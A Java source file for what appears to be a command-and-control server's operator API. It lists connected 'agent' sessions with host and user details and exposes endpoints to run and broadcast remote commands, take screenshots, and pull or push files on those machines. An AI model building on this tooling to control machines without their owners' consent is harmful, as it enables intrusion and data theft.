package com.raven.interfaces.APP.api;

import com.raven.core.command.AgentCommandDispatcher;
import com.raven.core.command.AgentCommandDispatcher.CommandResult;
import com.raven.core.database.TeamDatabase;
import com.raven.core.session.Session;
import com.raven.interfaces.APP.core.WebLogger;
import com.raven.interfaces.APP.core.WebServerManager;
import com.raven.interfaces.APP.shared.HttpHelper;
import com.sun.net.httpserver.HttpExchange;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public final class AgentApi {

    private final WebServerManager ServerManager;
    private final TeamDatabase Database;
    private final WebLogger Logger;

    public AgentApi(WebServerManager ServerManager, TeamDatabase Database, WebLogger Logger) {
        this.ServerManager = ServerManager;
        this.Database = Database;
        this.Logger = Logger;
    }

    private AgentCommandDispatcher BuildDispatcher(String Operator) {
        return new AgentCommandDispatcher(ServerManager.GetServer(), Database, Operator);
    }

    public String List(HttpExchange Exchange) {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Agents", java.util.Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session ActiveSession : ServerManager.GetServer().GetSessions().GetAll()) {
            Map<String, Object> Agent = new LinkedHashMap<>();
            Agent.put("ID", ActiveSession.GetId());
            Agent.put("Hostname", ActiveSession.GetHostname());
            Agent.put("OS", ActiveSession.GetOs());
            Agent.put("User", ActiveSession.GetUser());
            Agent.put("Arch", ActiveSession.GetArch());
            Agent.put("AgentIP", ActiveSession.GetAgentIp());
            Agent.put("AgentName", ActiveSession.GetAgentName());
            Agent.put("DisplayName", ActiveSession.GetDisplayName());
            Agent.put("SessionKey", ActiveSession.GetSessionKey());
            Agent.put("JoinedAt", ActiveSession.GetJoinedAt());
            Agent.put("Type", ActiveSession.GetSessionType().name());
            Agent.put("ShellMode", ActiveSession.GetShellMode());
            Agent.put("Encrypted", ActiveSession.IsEncrypted());
            Agent.put("MtlsEnabled", ActiveSession.IsMtlsEnabled());
            Agent.put("Note", Database.GetAgentNote(ActiveSession.GetId()));
            Agents.add(Agent);
        }
        return HttpHelper.Json(Map.of("Agents", Agents, "Count", Agents.size()));
    }

    public String Kill(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        ServerManager.GetServer().RemoveSession(AgentId);
        Logger.Add("[KILL] session-" + AgentId + " by " + Operator);
        return HttpHelper.Json(Map.of("Success", true));
    }

    public String Execute(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Command = HttpHelper.Str(Body, "Command", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || Command.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
        Logger.Add("[>] [" + Operator + "] session-" + AgentId + " >> " + Command);
        CommandResult Result = BuildDispatcher(Operator).Dispatch(AgentId, Command);
        return HttpHelper.Json(Map.of("Success", Result.Success(), "Output", Result.Output(), "Command", Result.Command()));
    }

    public String Broadcast(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        String Command = HttpHelper.Str(Body, "Command", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (Command.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
        @SuppressWarnings("unchecked")
        List<Object> RawIds = (List<Object>) Body.getOrDefault("AgentIds", List.of());
        List<Integer> Ids = new ArrayList<>();
        for (Object Id : RawIds)
            try {
                Ids.add((int) Double.parseDouble(Id.toString()));
            } catch (Exception Ignored) {}
        if (Ids.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentIds required"));
        Logger.Add("[BROADCAST] [" + Operator + "] > " + Ids.size() + " sessions >> " + Command);
        Map<Integer, CommandResult> Results = BuildDispatcher(Operator).BroadcastDispatch(Ids, Command);
        return BuildBroadcastResponse(Results);
    }

    public String BroadcastAll(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        String Command = HttpHelper.Str(Body, "Command", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (Command.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
        Logger.Add("[BROADCAST-ALL] [" + Operator + "] > " + ServerManager.GetServer().GetSessions().Count() + " sessions >> " + Command);
        Map<Integer, CommandResult> Results = BuildDispatcher(Operator).BroadcastAllDispatch(Command);
        return BuildBroadcastResponse(Results);
    }

    public String Screenshot(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        CommandResult Result = BuildDispatcher(Operator).Dispatch(AgentId, "screenshot");
        Logger.Add("[SCREENSHOT] session-" + AgentId + " >> " + (Result.Success() ? "saved" : Result.Output()));
        return HttpHelper.Json(Map.of("Success", Result.Success(), "Output", Result.Output()));
    }

    public String Download(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Path = HttpHelper.Str(Body, "Path", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || Path.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Path required"));
        CommandResult Result = BuildDispatcher(Operator).Dispatch(AgentId, "download " + Path);
        Logger.Add("[DOWNLOAD] session-" + AgentId + " << " + Path + (Result.Success() ? " OK" : " FAILED"));
        return HttpHelper.Json(Map.of("Success", Result.Success(), "Output", Result.Output(), "Path", Path));
    }

    public String Upload(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String LocalPath = HttpHelper.Str(Body, "LocalPath", "");
        String RemotePath = HttpHelper.Str(Body, "RemotePath", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || LocalPath.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required"));
        String FullCommand = "upload " + LocalPath + (RemotePath.isEmpty() ? "" : " " + RemotePath);
        CommandResult Result = BuildDispatcher(Operator).Dispatch(AgentId, FullCommand);
        Logger.Add("[UPLOAD] session-" + AgentId + " >> " + LocalPath + (Result.Success() ? " OK" : " FAILED"));
        return HttpHelper.Json(Map.of("Success", Result.Success(), "Output", Result.Output()));
    }

    public String SetNote(HttpExchange Exchange) throws Exception {
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        Database.SetAgentNote(HttpHelper.Num(Body, "AgentId", 0), HttpHelper.Str(Body, "Note", ""));
        return HttpHelper.Json(Map.of("Success", true));
    }

    public String GetAllNotes(HttpExchange Exchange) {
        return HttpHelper.Json(Map.of("Notes", Database.GetAllAgentNotes()));
    }

    private String BuildBroadcastResponse(Map<Integer, CommandResult> Results) {
        Map<String, Object> Out = new LinkedHashMap<>();
        Results.forEach((SessionId, Result) -> Out.put(String.valueOf(SessionId), Map.of("Success", Result.Success(), "Output", Result.Output())));
        return HttpHelper.Json(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }
}
